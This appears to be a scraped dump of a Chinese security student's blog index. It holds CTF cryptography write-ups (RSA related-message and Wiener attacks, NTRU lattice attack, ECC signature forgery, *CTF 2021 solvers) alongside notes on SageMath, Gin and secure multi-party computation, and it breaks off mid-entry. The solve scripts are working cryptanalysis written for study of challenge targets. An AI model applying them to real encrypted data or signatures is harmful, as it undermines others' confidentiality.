there\\;must\\;exist\\;\\\\\\\\ (k10,k21)\\\\\\\\ (k11,k20)\\\\\\\\ (k10,k20)\\\\\\\\ dec(g1, (key1\\_0, key2\\_0))= dec(g2, (key1\\_0, key2\\_1))= dec(g3, (key1\\_1, key2\\_0)) $$ 综上，可以得到 key1_1, key2_1 的准确值\nplagiarism # algorithm：\nSo we have two ciphertexts:\nC1 = P1e mod(N)\nC2 = P2e mod(N)\nwhere second text is simply first with known difference:\nP2 = P1+δ\nso we have after substitution:\nf = P1e mod(N) - C1\ng = (P1+δ)e mod(N) - C2\nCalculating GCD(f,g) will give us common dividor a * P1 + b so P1 = -b⁄a.\nsage 多项式环算 gcd\nR = PolynomialRing(Zmod(n), \u0026#39;X\u0026#39;) X = R.gen() f1 = (X)**e - c1 f2 = (X + delta)**e - c2 r = gcd(f1, f2) def hgcd(a0,a1): if a1.degree() \u0026lt;= (a0.degree()//2): return np.array([[1,0],[0,1]]) m = a0.degree()//2 X = a0.variables()[0] b0 = a0 // X**m b1 = a1 // X**m R = hgcd(b0,b1) [d,e] = (R.dot(np.array([a0,a1]).transpose())).transpose() ff = d % e m = m // 2 g0 = e // X**m g1 = ff // X**m S = hgcd(g0,g1) q = d // e return S.dot(np.array([[0,1],[1,-q]])).dot(R) def gcd(a0,a1): while True: print(a0.degree(), end=\u0026#34;, \u0026#34;, flush=True) if a0 % a1 == 0: return a1 if a0.degree() == a1.degree(): a1 = a0%a1 #print(a0.degree()) R = hgcd(a0,a1) [b0,b1] = R.dot(np.array([a0,a1]).transpose()).transpose() if b0%b1==0: return b1 c = b0 % b1 a0 = b1 a1 = c ","date":"23 February 2021","permalink":"/achieve/ctf/dicectf2021/","section":"archive","summary":"","title":"dicectf2021"},{"content":"[toc]\n一年过去了呢,稍微记一下这一年到头都干了些什么事吧\n回家后心情莫名变好了\n不管怎么说又成功无伤混了一学期呢(￣y▽,￣)╭\n不分先后随缘排序\n2021 # 东高联跨年\n抓住最后一点落日\n古镇\n放假前一天\n学校的家底\n摸黑干饭 喝了味道不咋地的洋酒\n下半年 # 宣讲\n川大\n下雪了\n乌苏还可以\n回到老巢\n南京 # 秦淮河\n南邮边上的那啥湖\n北京 # 明长城\n独具特色的地铁站\n还行，人不是特别多\n下火车\n传统艺能深夜便利店\n天津 # 县上的绿皮火车站\n便利店传统艺能\n上半年 # 折腾双系统\n成功蓝屏\n宽窄巷子\n","date":"23 February 2021","permalink":"/achieve/loving-2020/","section":"archive","summary":"[toc]","title":"loving-2020"},{"content":"","date":"23 February 2021","permalink":"/categories/notes/","section":"Categories","summary":"","title":"notes"},{"content":"[toc]\nSR.var(\u0026#39;x\u0026#39;,10) 创建 x数组[0~9] # the same command works also with SR.var(\u0026#39;a, b, c, x\u0026#39; a, b, c, x = var(\u0026#39;a, b, c, x\u0026#39;) a, x = var(\u0026#39;a, x\u0026#39;) expr = cos(x+a) * (x+1) expr (x+1)cos(a+x) expr.subs(a == -x) x+1 expr.subs(x == pi, a == pi) 5cos(8) substitute/subs 添加条件 n = var(\u0026#39;n\u0026#39;) assume(n, \u0026#39;integer\u0026#39;) 不妨设 n 为整数 sin(n * pi) 0 assume(n \u0026gt; 0) assumptions()将所有现存的假设作为条件输出 [n is integer, n \u0026gt; 0] forget() 遗忘所有假设 Sage还是简化符号表达式的强大工具。 # f=(x^2-1) / (x+1) # (x^2 - 1)/(x + 1) 未知数f 拥有这些符号变量 生成常规ecc曲线 # In Sage, an elliptic curve is always specified by (the coefficients of) a long Weierstrass equation\n$y^2+a_1xy+a_3y=x^3+a_2x^2+a_4x+a_6$\nparameter2：EllipticCurve(p，[a1,a2,a3,a4,a6])\n25519\nE = EllipticCurve(GF(2^255 - 19), [0, 486662, 0, 1, 0]) p = E.order()\t# 求阶 ZmodP = Zmod(p) #构建环 G = E.lift_x(9) # x为9的点 *ctf ecc\n_F=GF(2**100) _G = (_F.fetch_int(698546134536218110797266045394),_F.fetch_int(1234575357354908313123830206394)) _P = (_F.fetch_int(403494114976379491717836688842), _F.fetch_int(915160228101530700618267188624)) E = EllipticCurve(GF(2**100), [1, 2, 0, 0, 3]) # 常规点转为ecc点 G = E(G) P = E(P) 多项式环 # R = PolynomialRing(Zmod(n), \u0026#39;X\u0026#39;) X = R.gen() f1 = (X)**e - c1 f2 = (X + delta)**e - c2 return sympy.nextPrime((B!)%A) 解方程 # var(\u0026#39;x\u0026#39;) sol = solve([x^2 - p_q*x + N == 0], [x]) print(sol) # sagemath会返回算式 small_roots # PR.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(N)) f = p0 + x f = f.monic() roots = f.small_roots(X=2^430, beta=0.4) if roots: p = p0 + roots[0] print(p) ","date":"23 February 2021","permalink":"/achieve/2019to2021/sagemath%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/","section":"archive","summary":"\u003cp\u003e[toc]\u003c/p\u003e","title":"sagemath入门笔记.md"},{"content":"[toc]\n这几天写gin的一些东西 # 登录 # get得到html界面\npost：\ngin接受html表单传回的post数据\nhtml的js接收gin传回的json实现前后端简单的交互\n登录流程\n检测cookie是否已经登录 检测用户名是非为空 检测数据库中是非有改用户名 检测密码 注册 # 注册流程\n检测cookie 检测是非为空 检测数据库是非有对应邮箱 注册成功 后期加上邮箱格式验证（\ncookie # setUserCookie # 将该user的结构体json化传回\nlogout # 清除usercookie\n","date":"23 February 2021","permalink":"/achieve/2019to2021/gin%E7%AC%94%E8%AE%B0/","section":"archive","summary":"[toc]","title":"gin笔记.md"},{"content":"[toc]\nsm2 # SM2是\r国家密码管理局于2010年12月17日发布的椭圆曲线公钥密码算法。\necc回顾 # 选取曲线 Ep(a,b) Alice取 基点G和私钥k,计算公钥 pubk.传pubk和G给bob bob计算 C1=M+rK；C2=rG传给alice A接到信息后，计算C1-kC2，结果就是点M 描述一条Fp上的椭圆曲线，常用到六个参量：T=(p,a,b,G,n,h)\np a b用来确定曲线\nG为基点，n为点G的阶，h 是椭圆曲线上所有点的个数m与n整除\n爱德华曲线简介 # 形如\n$x^2+y^2=1-d\\cdot x^2 \\cdot y^2$\n加法 # p1+p2\n2*p\n逆元\n（x，y）-\u0026gt;(-x,y)\n零元\n（0，1）\n爱德华曲线运算的几何意义 # 先考虑常规圆\n先建立一个但为远$x^2+y^2=1$\n考虑一个爱德华单位曲线\n常规爱德华曲线基本性质就这些了\n蒙哥马利曲线 Ed25519 签名 # 蒙哥马利曲线（Montgomery curve）是另一种形式的椭圆曲线\n常规ecc\n$y^2+a_1xy+a_3y=x^3+a_2x^2+a_4x+a_6$\n蒙哥马利曲线\n$By^2=x^3+Ax^2+x$\n","date":"23 February 2021","permalink":"/achieve/2019to2021/%E7%88%B1%E5%BE%B7%E5%8D%8E%E6%9B%B2%E7%BA%BF-%E8%92%99%E5%93%A5%E9%A9%AC%E5%88%A9/","section":"archive","summary":"[toc]","title":"爱德华曲线-蒙哥马利.md"},{"content":"[toc]\ntiming attack # 时序攻击属于侧信道攻击/旁路攻击\n比如加解密的速度/加解密时芯片引脚的电压/密文传输的流量和途径等进行攻击的方式，一个词形容就是“旁敲侧击”。\n某个函数负责比较用户输入的密码和存放在系统内密码是否相同，如果该函数是从第一位开始比较，发现不同就立即返回，那么通过计算返回的速度就知道了大概是哪一位开始不同的\ncenter-lifts ?\nntru密码算法 # 选取 n p q d\nn = 109 q = 2048 p = 3 q \u0026gt; (6d+1)p\n为公开参数\nq 最好为2的幂,不能为3的倍数\n取多项式 f g\nprikey\nf fq*f = 1 mod q g pubkey $$ h \\equiv pg*f_{q};mod;q $$\nenc # 取随机数 r,msg多项式化为m\nc = rh+m mod q\ndec # a = f*c= f (rh +m )=fprh + fm = f *r *pg fq mod q\na = rpg + m mod q\nm = a mod p\n攻击实例 # This attack breaks NTRU with n = 7, d = 5, q = 256.\ndef convolution(f, g): return (f * g) % (x ^ n-1) Zx.\u0026lt;x\u0026gt; = ZZ[] n = 7 d = 5 q = 256 h=-82*x^6 + 118*x^5 - 94*x^4 + 108*x^3 + 70*x^2 - 122*x + 5 h3 = ((171)*h) % q # lift(1/Integers(q)(p)) * h M = matrix(2*n) for i in range(n): M[i,i] = q for i in range(n,2*n): M[i,i] = 1 for i in range(n): for j in range(n): M[i+n,j] = convolution(h3,x^i)[j] print(M) print(M.LLL()[0]) ","date":"22 February 2021","permalink":"/achieve/2019to2021/ntru%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95/","section":"archive","summary":"[toc]","title":"ntru密码算法.md"},{"content":"[toc]\nwinner poorf # $$ \\begin{aligned} \u0026N = q\\times p\\\\ \u0026\\phi(n)=(p-1)\\times (q-1)\\\\ \u0026phi(n)\\approx n\\\\ \u0026ed =1 +k\\phi(n)\\\\ \u0026同除d\\phi(n)得\\\\ \u0026\\frac{e}{\\phi(n)}=\\frac{1}{d\\phi(n)}+\\frac{k}{d}\\\\ \u0026因为 \\phi(n)\\approx\\;n\\\\ \u0026\\frac{e}{N}=\\frac{1}{d\\phi(n)}+\\frac{k}{d}得到\\frac{k}{d}的近似值\\\\ \u0026利用求根公式或者以下步骤验证\\\\ \u0026ed=k(p-1)(q-1)+1\\\\ \u0026[\\frac{ed}{k}]=(p-1)(q-1)\\\\ \u0026\\frac{pq-(p-1)(q-1)1+1}{2}=\\frac{p+q}{2}\\\\ \u0026(\\frac{p+q}{2})^2-pq=(\\frac{p-q}{2})^2 \\end{aligned} $$ from sage.all import continued_fraction, Integer def wiener(e, n): m = 12345 c = pow(m, e, n) list1 = continued_fraction(Integer(e)/Integer(n)) conv = list1.convergents() for i in conv: d = int(i.denominator()) # 分母 m1 = pow(c, d, n) if m1 == m: return d n, e = pubkey print wiener(e, n) $\\frac{e}{N}=\\frac{1}{d\\phi(n)}+\\frac{k}{d}得到\\frac{k}{d}$\n的近似值后sagemath可以自行输出分子分母\nweird x-unca # e的取值范围为：\n$$ \\begin{equation}\\begin{split} \u0026e = \\frac{y}{x} \\cdot ((p+1)(q+1) \\pm \\frac{(p-q)\\cdot N^{0.21}}{3(p+q)})\\\\ \u0026\\frac{e}{n}=\\frac{y}{x}(1+\\frac{p+q+1}{n}\\pm\\frac{p-q}{3(p+q)N^{0.79}})\\\\ \u0026约等于\\frac{e}{n}=\\frac{y}{x}+0 \\end{split}\\end{equation} $$ x = getrandbits(512) y = getrandbits(512) for yx in continued_fraction(e/N).convergents(): y = yx.numerator() x = yx.denominator() if 505 \u0026lt; int(y).bit_length() \u0026lt; 512: print(y, x) ASIS Finals CTF 2017- Gracias Writeup # paper\nAndrej Dujella说分母不仅可以得到d，d还可以写成$d=tqi+sq_{i-1}$\nqi为第i次的分母\nfrom sage.all import continued_fraction, Integer from Crypto.Util.number import * def wiener(e, n): m = 12345 c = pow(m, e, n) q0 = 1 list1 = continued_fraction(Integer(e)/Integer(n)) conv = list1.convergents() for i in conv: k = i.numerator() # 分子 qi = i.denominator() # 分母 for r in range(20): for s in range(20): d = r*qi + s*qi_1 m1 = pow(c, d, n) if m1 == m: return d qi_1 = qi n, e = pubkey c1, c2 = c d = wiener(e, n) 西湖论剑-2020-Wake me up until May ends-task # limit1 = (3 * n) // (2 * (int(iroot(n, 4)[0]) + 3 * (p + q))) x * y \u0026lt; limit1 limit2 = (abs(p-q) * int(iroot(n, 4)[0]) * y) // (6 * (max(p, q))) z = e * x - y * _phi abs(z) \u0026lt; limit2 limit1 $xy\u0026lt;\\frac{3n}{2n^{\\frac{1}{4}}+3(p+q)}$\nlimit2 (assume q\u0026gt;p) $z=ex-y\\phi(n)\u0026gt;\\frac{(p-q)n^{\\frac{1}{4}}y}{6q}$ 由于e是一个一个减下去的，可以近似看为等号\n$e = (\\frac{(p-q)n^{\\frac{1}{4}}}{6q}+\\phi(n))\\frac{y}{x}$ $\\frac{e}{n} = (\\frac{(p-q)n^{\\frac{1}{4}}}{6qn}+\\frac{\\phi(n)}{n})\\frac{y}{x}\\approx\\frac{y}{x}$\n","date":"22 February 2021","permalink":"/achieve/2019to2021/%E8%BF%9E%E5%88%86%E6%95%B0%E4%BB%A3%E7%A0%81/","section":"archive","summary":"[toc]","title":"连分数代码.md"},{"content":"\r安全多方计算 # 很重要的老东西了，但应用范围极其广泛，作为科普学习一下蛮好的\n安全的分布式计算 MPC (Secure multi-party computation)指的是用户在无需进行数据归集的情况下，完成数据协同计算，同时保护数据所有方的原始数据隐私。具体来说，有n个计算参与方，分别持有私有数据$x_1,x_2x_3,..x_i,$共同计算既定函数$f(x_1\u0026hellip;x_n)=y$\n混淆电路（Garbled Circuit) # 前提知识 # Garbled Circuit是MPC的一种实现方式，由姚期智先生提出（那是真滴牛批），通俗的说，就是一堆人各自拥有其隐私数据，他们想把这些数据合起来算点什么，但又不想把数据交给别人，混淆电路解决的就是此类问题。\nOblivious Transfer 不经意传输 # Oblivious Transfer，中文称为不经意传输，通常简写为OT\n它指的是发送者从一个值集合中向接收者发送单个值的问题，这里发送者无法知道发送的是哪一个值，而且接收者也不能获知除了接收值之外的其它任何值。\n发送者有由N个值组成的集合，接收者有 $i$ 协议执行完成,接收者只知道 $i$ 协议,且发送者不知道 $i$ 协议,\n协议执行的过程中，满足以下性质：\n发送者不知道接受者要那个 接受者只能成功获取需要的那个值 这张图就很灵性\n姚氏百万富翁问题 这个问题的解提供了一种 将两个信息隐藏在不同 “维度” 但只有我才能通过我们共同生成的信息中知晓问题的答案的模型\nMPC的中心思想，那就是彼此把数据x，y藏在自己的维度上，然后找到一个交点，就是我们需要共同计算的函数f（x，y）。Yao的姚氏百万富翁问题仅限于比较大小，即一个布尔值的计算。\n当然后来一个在此基础上一个更加伟大的密码学算法被发明出来了，那就混淆电路。它把这个交点扩展到任何电脑可计算的函数，从此不管是比较大小，还是复杂到神经网络，都可以用类似的方法计算了。\n应用 # 应用到计算机上的例子可以理解为我有一个 and 门 两个输入一个输出\ntable\nx y z 1 1 1 1 0 0 0 0 0 0 1 0 加密这些真值表将电路转换成加密电路Garbled Circuit\n这里table每一个位置的每一种值都对应了一个key\n假设实例table\nx y z 1 1 0 1 0 1 0 0 0 0 1 0 实际计算中表会生成四个数据\nAlice用这些密钥加密真值表，并将该表打乱后发送给Bob，比如Alice的输入是0，那就发$k_0$，输入是1就发 $k_1$\n同时把和Bob有关的key都发给Bob\nBob根据收到的 key 对上述加密表 根据输入选择一行解密并提取出相应的kz\nBob将kz发给Alice，Alice通过对比得知计算结果是0还是1\n","date":"20 February 2021","permalink":"/achieve/2019to2021/%E5%8F%88%E4%B8%80%E4%B8%AA%E5%A5%BD%E7%8E%A9%E7%9A%84%E4%B8%9C%E8%A5%BF/","section":"archive","summary":"安全多方计算 # 很重要的老东西了，但应用范围极其广泛，作为科普学习一下蛮好的","title":"又一个好玩的东西"},{"content":" 蛮有意思的小case\n用了蒙哥马利曲线25519的签名算法\n整个题的核心再这里\nreturn e == hashs(m, s*G + e*P, s*hashp(P) + e*I) 除要求输入的参数 e , s 和点 I 外其他参数都是给出了的，所以需要选取事等式实现的e s I，但hashs是单向的 所以构造常规的等式并不现实，将hashs参数设为 $hashs（ m ，A ，B）$ 进行思考，\n由于无法从e推到A和B 不妨假设A B已知,得到\n$e=hashs(m,A,B)$\n有 $$ \\begin{cases} A = s\\cdot G+e\\cdot P\\ B = s\\cdot H_p(p)+e\\cdot I \\end{cases} $$ 不妨令$A= a\\cdot G;,B= b\\cdot G$ 并且输入的 $I$一定在ecc上\n故有 $$ \\begin{cases} a\\cdot G = s\\cdot G+e\\cdot P\\ b\\cdot G = s\\cdot H_p(p)+e\\cdot I \\end{cases} \\to \\begin{cases} s = a - ex\\ iG=(b\\cdot G-s\\cdot H_p(p))\\cdot e^{-1} \\end{cases} $$ $$e=hashs(m,aG,bG)$$\n那么接下来的任务就是去找a和b了\na和b的范围还有约束条件除了满足e有逆元外好像完全没有任何头绪,但是G的选取帮了我们大忙\n由于G是生成元,所以不用担心会不存在使 $$ \\begin{cases} A = s\\cdot G+e\\cdot P\\ B = s\\cdot H_p(p)+e\\cdot I \\end{cases} $$ 成立的$e ,s, I$\n经验证,只需要满足e能够取到逆元就ok了\n# sage # -*- encoding: utf-8 -*- \u0026#39;\u0026#39;\u0026#39; @File : exp_me.sage @Time : 2021/02/10 15:05:20 @Author : ljahum @Contact : roomoflja@gmail.com @Desc : None \u0026#39;\u0026#39;\u0026#39; # code here from os import environ environ[\u0026#39;PWNLIB_NOTERM\u0026#39;] = \u0026#39;True\u0026#39; from pwn import remote from hashlib import sha256 ha = lambda x: x if isinstance(x, int) or isinstance(x, Integer) else product(x.xy()) hashs = lambda *x: int.from_bytes( sha256(b\u0026#39;.\u0026#39;.join([b\u0026#39;%X\u0026#39; % ha(x) for x in x])).digest(), \u0026#39;little\u0026#39;) % p def hashp(x): x = hashs((x)) while True: try: return E.lift_x(x) except: x = hashs((x)) E = EllipticCurve(GF(2 ^ 255 - 19), [0, 486662, 0, 1, 0]) p = E.order() ZmodP = Zmod(p) G = E.lift_x(9) cn = remote(\u0026#39;0.0.0.0\u0026#39;, 10000) data = cn.recvline().decode().strip() print(data) x = int(data.split()[0]) P = x*G m = int(data.split()[-1]) tot =0 while tot \u0026lt;8: a = randint(1, p) b = randint(1, p) aG = a*G bG = b*G e = hashs(m, aG, bG) if not e \u0026amp; 1: print(\u0026#39;try again\u0026#39;) continue s = a - e*x e_inv = inverse_mod(e,p) I = e_inv*(bG - s*hashp(P)) Ix = I.xy()[0] Iy = I.xy()[1] cn.sendlineafter(\u0026#39;I (x): \u0026#39;, str(Ix)) cn.sendlineafter(\u0026#39;I (y): \u0026#39;, str(Iy)) cn.sendlineafter(\u0026#39;e: \u0026#39;, str(e)) cn.sendlineafter(\u0026#39;s: \u0026#39;, str(s)) cn.recvline() tot += 1 print(cn.recvall()) ","date":"16 February 2021","permalink":"/achieve/ctf/catthefish/","section":"archive","summary":"蛮有意思的小case","title":"很古典的思维catthefish2021"},{"content":"\r*ctf2021 # myenc # ct=iv for i in range(1,8): if keystream[cnt]==\u0026#39;1\u0026#39;: ct+=pow(m^q,i**i**i,n) ct%=n cnt=(cnt+1)%len(keystream) print(\u0026#34;done:\u0026#34;,ct) 主要难点在这里\npow(m^q,i**i**i,n)无法正常求解，直接看做7个不变的未知数，外加iv，就是8个不变的未知数，keystream看做向量k，可以把原题看做以下矩阵 $$\n\\begin{cases} k_1x_1 +\u0026amp; \\cdots \u0026amp; k_7x_7;;+iv=C_1\\\\ k_8x_1 + \u0026amp; \\cdots \u0026amp; k_{14}x_7 ;+iv=C_2\\\\ \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \\\\ k_{113}x_1 +\u0026amp; \\cdots \u0026amp; k_{119}x_7 \\;+iv=C_{17}\\\\ k_{120}x_1 +\u0026amp; \\cdots \u0026amp; k_6x_7\\;\\;\\;+iv;=C_{18}\\\\ k_{7}x_1 +\u0026amp; \\cdots \u0026amp; k_{13}x_7\\;\\;+iv\\;=C_{19}\\\\ \\vdots \\end{cases}\n$$\n对k1到k7*8爆破是不明智的，选取其他等式组合一下，目标是尽可能用少的k覆盖多的x： $$ \\begin{pmatrix} k_8 \u0026amp; \\cdots \u0026amp; k_{14}\u0026amp;1\\\\ k_7 \u0026amp; \\cdots \u0026amp; k_{13} \u0026amp;1\\\\ \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \\\\ k_{1}\u0026amp; \\cdots \u0026amp; k_{7} \u0026amp;1 \\end{pmatrix}\n\\begin{pmatrix} x_1\\\\ x_{2}\\\\ \\end{pmatrix}\n\\begin{pmatrix} C_2\\\\ C_{19}\\\\ \\end{pmatrix}\n$$\n这个时候对 K 矩阵爆破的复杂度只有$O(2^{14})$写脚本获取121+组数据一把梭哈就ok了\n接收数据并全部写入文件\nfrom pwn import *\rfrom hashlib import md5, sha256\rfrom itertools import product\rfrom string import digits, ascii_letters\rfrom icecream import *\rdef getxxxx():\rr.recvuntil(b\u0026#39;xxxx+\u0026#39;)\rbuf = r.recvuntil(b\u0026#39;) \u0026#39;)[:-2]\rs2 = buf\rr.recvuntil(b\u0026#39;= \u0026#39;)\rbuf = r.recvuntil(b\u0026#39;\\\\n\u0026#39;)[:-1]\rhashenc = (buf.decode())\ric(s2, hashenc)\rtab = bytes(digits + ascii_letters, encoding=\u0026#39;utf-8\u0026#39;)\rfor s1 in product(tab, repeat=4):\rdata = bytes(s1) + s2\rhash_data = sha256(data).hexdigest()\rif hash_data == hashenc:\ric(hash_data, hashenc)\rbuf = r.recv(1024)\rprint(buf)\rprint(bytes(s1))\rr.sendline(bytes(s1))\r# buf = r.recv(1024)\r# print(buf)\rreturn bytes(s1)\r# input()\rr = remote( \u0026#39;52.163.228.53\u0026#39;, 8081)\rgetxxxx()\r# r = remote(\u0026#39;0.0.0.0\u0026#39;, 10000)\rf = open(\u0026#39;./远程记录的密文.py\u0026#39;, \u0026#39;a\u0026#39;)\rf.seek(0)\rf.truncate()\rbuf = r.recvuntil(b\u0026#39;\\\\ngive me a number:\\\\n\u0026#39;)\rprint(buf)\rn = int(buf[len(\u0026#39;n: \u0026#39;):-len(\u0026#39;\\\\ngive me a number:\\\\n\u0026#39;)])\rprint(n)\rf.write(\u0026#39;n=\u0026#39;+str(n)+\u0026#39;\\\\n\u0026#39;)\rr.sendlines(\u0026#39;0\u0026#39;)\rans = []\rfor i in range(125):\rbuf = r.recvuntil(b\u0026#39;\\\\ngive me a number:\\\\n\u0026#39;)\r# print(buf)\rt = int(buf[len(\u0026#39;done: \u0026#39;):-len(\u0026#39;\\\\ngive me a number:\\\\n\u0026#39;)])\rprint(t)\rans.append(t)\rr.sendlines(\u0026#39;0\u0026#39;)\rprint(ans)\rf.write(\u0026#39;enc=[\u0026#39;)\rfor i in ans:\rf.write(str(i)+\u0026#39;,\\\\n\u0026#39;)\rf.write(\u0026#39;]\u0026#39;)\r# input(\u0026#34;按任意键继续\u0026#34;) sage爆破矩阵脚本\nfrom 远程记录的密文 import n, enc\rfrom Crypto.Util.number import *\rdef getall(l):\rx = l[:7]\riv = l[7]\rtab = []\rfor i in range(128):\rbin_arr = (bin(i)[2:].rjust(7, \u0026#39;0\u0026#39;))\r# print(bin_arr)\rtemp = 0\rfor j in range(len(bin_arr)):\rtemp += int(bin_arr[j])*x[j]\rtemp += iv\rtemp %= n\r# print(temp)\r# input()\rtab.append(temp)\rflag = \u0026#39;\u0026#39;\rfor i in enc:\r# print(tab.index(i))\rflag += bin(tab.index(i))[2:].rjust(7, \u0026#39;0\u0026#39;)\rflag = flag[:120]\rflag = (int(flag, 2))\rprint(long_to_bytes(flag))\rdef get_x(c, m, _):\r# 矩阵行列化\r# x = [[i]for i in x]\rc = [[i] for i in c]\rm = m[::-1]\rc = Matrix(Zmod(n), c)\rm = Matrix(Zmod(n), m)\rx1 = (m.inverse()*c)\r# print(x1)\rl = []\rfor i in x1:\rl.append(i[0])\rgetall(l)\rc = []\rfor i in range(8):\rj = i*17+2\rc.append(enc[j-1])\rfor _ in range(0x4000):\rkey = bin(_)[2:].rjust(14, \u0026#39;0\u0026#39;)\r# key = \u0026#39;00101010010000\u0026#39;\rm = []\rl = []\rfor i in range(8):\rfor j in range(i, i+7):\r# print(j,end=\u0026#39; \u0026#39;)\rl.append(int(key[j]))\rl.append(1)\rm.append(l)\rl = []\r# for i in m:\r# print(i)\r# ============\r# get_x(c, m, _)\rtry:\rget_x(c, m, _)\rexcept:\rcontinue\r# *CTF{yOuG0t1T!} myCurve # 二元爱德华兹曲线（Binary Edwards Curves）\n反正🧓也没打算大二完全搞明白这种数学👴玩的玩意\nsage\nfrom Crypto.Util.number import * def To_Birational(point): x, y = point return (3*(x+y)) / (x*y + x + y), 3*(x / (x*y+x+y) + 2) F=GF(2**100) R.\u0026lt;x,y\u0026gt;=F[] d1=F.fetch_int(1) d2=F.fetch_int(1) x,y=(698546134536218110797266045394L, 1234575357354908313123830206394L) G=(F.fetch_int(x),F.fetch_int(y)) x, y = (403494114976379491717836688842L, 915160228101530700618267188624L) P =(F.fetch_int(x),F.fetch_int(y)) G = To_Birational(G) P = To_Birational(P) E = EllipticCurve(GF(2**100), [1, 2, 0, 0, 3]) G = E(G) P = E(P) flag = G.discrete_log(P) print(long_to_bytes(flag)) 爱德华曲线运算在区块链中应用广泛\nlittle case # 先用维纳解p的值，再尝试把$\\phi(n)$分解，瞬间出来两个4500左右的值和一个很大的解不动的值，nctf2019有一个题有这个开方脚本，这个题 e 的大小甚至和nctf2019那个题是一样的。。。。\n当时完全没有注意到去检查参数长度。。。太拉了。。。满脑子LLL\n","date":"5 January 2021","permalink":"/achieve/ctf/starctf/","section":"archive","summary":"*ctf2021 # myenc # ct=iv for i in range(1,8): if keystream[cnt]==\u0026#39;1\u0026#39;: ct+=pow(m^q,i**i**i,n) ct%=n cnt=(cnt+1)%len(keystream) print(\u0026#34;done:\u0026#34;,ct) 主要难点在这里","title":"star CTF2021"},{"content":"\r一个逆向 # 解题思路逐渐离谱 \u0026mdash;- pandaos\nmain # from data import sums def tolist(m): l = list(list(m)[0]) return l def xor(a,b): return eval(\u0026#34;%s^%s\u0026#34; % (a, b)) def xorl(a, b): return [xor(a[i],b[i]) for i in range(42)] def slove_flag(enc,m): enc = matrix(42, enc) m = matrix(42, 42, m) flag = m ^ (-1)*enc flag = (tolist(flag.T)) flag = xorl(flag, xordata) return flag xordata = [0xA0, 0xE4, 0xBA, 0xFB, 0x10, 0xDD, 0xAC, 0x65, 0x8D, 0x0B, 0x57, 0x1A, 0xE4, 0x28, 0x96, 0xB3, 0x0C, 0x79, 0x4D, 0x80, 0x90, 0x99, 0x58, 0xFE, 0x50, 0xD3, 0xF9, 0x3C, 0x0F, 0xC1, 0xE3, 0xA6, 0x39, 0xC3, 0x28, 0x75, 0xF8, 0xC9, 0xC8, 0xCD, 0x78, 0x26] enc = [775008, 736965, 579982, 832102, 739711, 689694, 621261, 786007, 687380, 870278, 671072, 705346, 695702, 726075, 693811, 726115, 797388, 839688, 798029, 773858, 732406, 632966, 740936, 775656, 710214, 858672, 686622, 608896, 815068, 521720, 693197, 560581, 885102, 635306, 732285, 770318, 702253, 632762, 839978, 813599, 651986, 875709] print(enc ans=[] for i in range(0x100): try: flag = bytes(slove_flag(enc,sums[i])) print(flag) ans.append(flag) except: continue print(ans) # b\u0026#39;flag{94bb46eb-a0a2-4a4a-a3d5-2ba877deb448}\u0026#39; data # 利用srand(x)函数生成x=0~0xff的所有随机数数据\n数据来源鸣谢 : c0rrsx2@syclover\n数据：\rdata.py\n","date":"27 December 2020","permalink":"/achieve/2019to2021/huawei-xctf-sth/","section":"archive","summary":"一个逆向 # 解题思路逐渐离谱 \u0026mdash;- pandaos","title":"一点好玩的东西"},{"content":"做了一点微小的工作\nwp # 爆破 # python\nfrom itertools import product import hashlib import string tab = string.ascii_lowercase + string.digits print(tab) tab = \u0026#39;abcdef0123456789\u0026#39; for i in product(tab,repeat=6): s = \u0026#39;\u0026#39;.join(i) # print(s) broken_flag = \u0026#39;d0g3{71b2b5616\u0026#39;+s[:2]+\u0026#39;2a4639\u0026#39;+s[2:4]+\u0026#39;7d979\u0026#39;+s[4:]+\u0026#39;de964c}\u0026#39; s = bytes(broken_flag, encoding=\u0026#39;utf-8\u0026#39;) ciphier = hashlib.sha256(s).hexdigest() if ciphier == \u0026#39;0596d989a2938e16bcc5d6f89ce709ad9f64d36316ab80408cb6b89b3d7f064a\u0026#39;: print(broken_flag) exit() # d0g3{71b2b5616ee2a4639a07d979ebde964c} aes # get key\nIn [4]: a = 0x7d3424647d3424647d3424647d342464\rIn [5]: b = 0x19044357064341081e5b4901045b5119\rIn [6]: from Crypto.Util.number import *\rIn [7]: long_to_bytes(a^b)\rOut[7]: b'd0g3{welcomeyou}'\rpython\nfrom Crypto.Util.number import * from Crypto.Cipher import AES from itertools import product msg = b\u0026#39;Welcome to this competition, I hope you can have fun today!!!!!!\u0026#39; m = [] for i in range(0,len(msg)-1,16): # print(msg[i: i+16]) m.append(msg[i:i+16]) print(m[i//16]) c4 = b\u0026#39;\u0026lt;\\x97l\\x92\\xaf\\xf4\\tZ#\\xe8\\x85\\xb1\\x95\\x07{f\u0026#39; key = b\u0026#39;d0g3{welcomeyou}\u0026#39; aes = AES.new(key, AES.MODE_ECB) M4 = aes.decrypt(c4) # ----------------------------- c3 = b\u0026#39;\u0026#39; for i in range(16): c3 += bytes([m[3][i]^M4[i]]) print(\u0026#39;c3\u0026#39;,c3) M3 = aes.decrypt(c3) # ----------------------------------------- c2 = b\u0026#39;\u0026#39; for i in range(16): c2 += bytes([m[2][i] ^ M3[i]]) print(\u0026#39;c2\u0026#39;, c2) M2 = aes.decrypt(c2) # --------------------------------- c1 = b\u0026#39;\u0026#39; for i in range(16): c1 += bytes([m[1][i] ^ M2[i]]) print(\u0026#39;c2\u0026#39;, c1) M1 = aes.decrypt(c1) # --------------------------------------- flag = b\u0026#39;\u0026#39; for i in range(16): flag += bytes([m[0][i] ^ M1[i]]) print(\u0026#39;flag\u0026#39;, flag) # aEs_1s_SO0o_e4sY # b\u0026#39;\\xf7f\\xe2A\\xd4\\x1d\\x87Qr\\x97c\\xbe\\xc9\u0026#34;\\xad\\xdf\u0026#39; rsa # challenge1 # from Crypto.Util.number import * from gmpy2 import * hint1 = 134805774328615624446574490322803283547316698647214138487576352482438867186094276263735342558169004773286779632939369099910639984165263724781958841009573156241531958373198729926012152201548649349842790727259831232277600944618096069835436884888782994513452252257103877595707828731260669076400456300668581565291455061609385003064649522735776446930209884653223939689686840631001863143579575759834304817613040932998629846110770749941179601474484275548912570668460216633586988225562794026430881265344731575650165992321629617982004131413202026628777742093026476064486873565664625105013298396598413667761372217260994853420062861590358 # hint1 = 2 * d + 246810 * e * phi e = 54347 m = 2 n = 